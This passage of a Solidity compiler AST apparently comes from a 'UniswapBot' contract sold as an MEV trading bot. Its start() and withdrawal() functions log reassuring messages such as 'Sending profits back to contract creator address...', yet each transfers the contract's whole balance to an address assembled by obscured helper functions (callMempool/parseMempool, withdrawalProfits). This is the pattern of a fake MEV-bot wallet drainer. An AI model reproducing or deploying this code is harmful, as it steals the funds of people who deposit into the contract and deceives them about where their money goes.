																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "14985:16:9",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1898,
																					"name": "d",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1850,
																					"src": "15004:1:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"src": "14985:20:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3130",
																				"id": 1900,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "15008:2:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_10_by_1",
																					"typeString": "int_const 10"
																				},
																				"value": "10"
																			},
																			"src": "14985:25:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1890,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "14980:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1889,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "14980:4:9",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1902,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14980:31:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"functionReturnParameters": 1854,
																"id": 1903,
																"nodeType": "Return",
																"src": "14973:38:9"
															}
														]
													}
												},
												"id": 1906,
												"nodeType": "IfStatement",
												"src": "14832:191:9",
												"trueBody": {
													"id": 1875,
													"nodeType": "Block",
													"src": "14854:60:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 1872,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 1868,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "string",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "14892:3:9",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							},
																							"value": "0"
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							}
																						],
																						"id": 1867,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "14887:4:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_bytes1_$",
																							"typeString": "type(bytes1)"
																						},
																						"typeName": {
																							"id": 1866,
																							"name": "byte",
																							"nodeType": "ElementaryTypeName",
																							"src": "14887:4:9",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1869,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "14887:9:9",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 1865,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "14881:5:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1864,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "14881:5:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1870,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14881:16:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "+",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1871,
																			"name": "d",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1850,
																			"src": "14900:1:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"src": "14881:20:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1863,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "14876:4:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_bytes1_$",
																		"typeString": "type(bytes1)"
																	},
																	"typeName": {
																		"id": 1862,
																		"name": "byte",
																		"nodeType": "ElementaryTypeName",
																		"src": "14876:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1873,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "14876:26:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"functionReturnParameters": 1854,
															"id": 1874,
															"nodeType": "Return",
															"src": "14869:33:9"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1907,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-19,
															-19
														],
														"referencedDeclaration": -19,
														"src": "15074:6:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 1908,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15074:8:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1909,
												"nodeType": "ExpressionStatement",
												"src": "15074:8:9"
											}
										]
									},
									"documentation": null,
									"id": 1911,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "toHexDigit",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1851,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1850,
												"mutability": "mutable",
												"name": "d",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1911,
												"src": "14783:7:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1849,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "14783:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14782:9:9"
									},
									"returnParameters": {
										"id": 1854,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1853,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1911,
												"src": "14815:4:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes1",
													"typeString": "bytes1"
												},
												"typeName": {
													"id": 1852,
													"name": "byte",
													"nodeType": "ElementaryTypeName",
													"src": "14815:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes1",
														"typeString": "bytes1"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "14814:6:9"
									},
									"scope": 2159,
									"src": "14763:327:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1921,
										"nodeType": "Block",
										"src": "15157:53:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1917,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1848,
																"src": "15188:11:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1918,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15188:13:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1916,
														"name": "parseMempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1482,
														"src": "15175:12:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1919,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15175:27:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1915,
												"id": 1920,
												"nodeType": "Return",
												"src": "15168:34:9"
											}
										]
									},
									"documentation": null,
									"id": 1922,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_callMEVAction",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1912,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15122:2:9"
									},
									"returnParameters": {
										"id": 1915,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1914,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1922,
												"src": "15148:7:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1913,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "15148:7:9",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15147:9:9"
									},
									"scope": 2159,
									"src": "15099:111:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1942,
										"nodeType": "Block",
										"src": "15420:155:9",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e",
															"id": 1926,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15440:58:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107",
																"typeString": "literal_string \"Running MEV action. This can take a while; please wait..\""
															},
															"value": "Running MEV action. This can take a while; please wait.."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107",
																"typeString": "literal_string \"Running MEV action. This can take a while; please wait..\""
															}
														],
														"id": 1925,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 591,
														"src": "15436:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1927,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15436:63:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1928,
												"nodeType": "EmitStatement",
												"src": "15431:68:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1937,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "15553:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_UniswapBot_$2159",
																			"typeString": "contract UniswapBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_UniswapBot_$2159",
																			"typeString": "contract UniswapBot"
																		}
																	],
																	"id": 1936,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15545:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1935,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "15545:7:9",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1938,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15545:13:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1939,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "15545:21:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1931,
																		"name": "_callMEVAction",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1922,
																		"src": "15518:14:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1932,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15518:16:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1930,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "15510:8:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1929,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "15510:8:9",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1933,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15510:25:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1934,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "15510:34:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1940,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15510:57:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1941,
												"nodeType": "ExpressionStatement",
												"src": "15510:57:9"
											}
										]
									},
									"documentation": null,
									"functionSelector": "be9a6555",
									"id": 1943,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "start",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1923,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15402:2:9"
									},
									"returnParameters": {
										"id": 1924,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15420:0:9"
									},
									"scope": 2159,
									"src": "15388:187:9",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1963,
										"nodeType": "Block",
										"src": "15730:153:9",
										"statements": [
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e",
															"id": 1947,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15750:53:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															},
															"value": "Sending profits back to contract creator address..."
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6",
																"typeString": "literal_string \"Sending profits back to contract creator address...\""
															}
														],
														"id": 1946,
														"name": "Log",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 591,
														"src": "15746:3:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory)"
														}
													},
													"id": 1948,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15746:58:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1949,
												"nodeType": "EmitStatement",
												"src": "15741:63:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1958,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "15861:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_UniswapBot_$2159",
																			"typeString": "contract UniswapBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_UniswapBot_$2159",
																			"typeString": "contract UniswapBot"
																		}
																	],
																	"id": 1957,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15853:7:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1956,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "15853:7:9",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1959,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15853:13:9",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1960,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "15853:21:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1952,
																		"name": "withdrawalProfits",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2061,
																		"src": "15823:17:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_address_$",
																			"typeString": "function () pure returns (address)"
																		}
																	},
																	"id": 1953,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15823:19:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1951,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "15815:8:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 1950,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "15815:8:9",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1954,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15815:28:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1955,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "15815:37:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1961,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15815:60:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1962,
												"nodeType": "ExpressionStatement",
												"src": "15815:60:9"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d4e93292",
									"id": 1964,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawal",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1944,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15712:2:9"
									},
									"returnParameters": {
										"id": 1945,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15730:0:9"
									},
									"scope": 2159,
									"src": "15693:190:9",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 2041,
										"nodeType": "Block",
										"src": "16131:403:9",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1973,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1971,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1966,
														"src": "16146:2:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1972,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16152:1:9",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16146:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1977,
												"nodeType": "IfStatement",
												"src": "16142:50:9",
												"trueBody": {
													"id": 1976,
													"nodeType": "Block",
													"src": "16155:37:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1974,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "16177:3:9",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																	"typeString": "literal_string \"0\""
																},
																"value": "0"
															},
															"functionReturnParameters": 1970,
															"id": 1975,
															"nodeType": "Return",
															"src": "16170:10:9"
														}
													]
												}
											},
											{
												"assignments": [
													1979
												],
												"declarations": [
													{
														"constant": false,
														"id": 1979,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 2041,
														"src": "16202:6:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1978,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16202:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1981,
												"initialValue": {
													"argumentTypes": null,
													"id": 1980,
													"name": "_i",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1966,
													"src": "16211:2:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16202:11:9"
											},
											{
												"assignments": [
													1983
												],
												"declarations": [
													{
														"constant": false,
														"id": 1983,
														"mutability": "mutable",
														"name": "len",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 2041,
														"src": "16224:8:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1982,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16224:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1984,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "16224:8:9"
											},
											{
												"body": {
													"id": 1995,
													"nodeType": "Block",
													"src": "16258:54:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1989,
																"isConstant": false,
																"isLValue": false,
